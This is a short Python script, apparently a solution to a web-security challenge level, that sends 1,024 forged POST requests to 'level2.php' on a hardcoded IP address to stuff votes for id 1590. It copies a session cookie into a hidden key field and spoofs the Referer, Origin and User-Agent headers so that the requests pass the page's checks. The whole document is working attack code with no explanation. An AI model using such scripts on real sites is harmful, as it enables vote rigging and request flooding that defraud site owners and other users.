import requests


cookies = {
    "HoldTheDoor": "daa0fdd4f86db7dfa0842792b8f48462f78b4a9a"
}

headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;\
                q=0.9,image/webp,image/apng,*/*;\
                q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Length": "68",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=nb32nfhmvn7kjrj16pg5duq2t0;\
                HoldTheDoor=daa0fdd4f86db7dfa0842792b8f48462f78b4a9a",
    "Host": "158.69.76.135",
    "Origin": "http://158.69.76.135",
    "Referer": "http://158.69.76.135/level2.php",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0)\
                    Gecko/20100101 Firefox/47.0"
}

data = "id=1590&holdthedoor=Submit+Query&\
        key=daa0fdd4f86db7dfa0842792b8f48462f78b4a9a"

for i in range(1024):
    resp = requests.request("POST", "http://158.69.76.135/level2.php",
            cookies=cookies, headers=headers, data=data)
    print(resp.status_code)
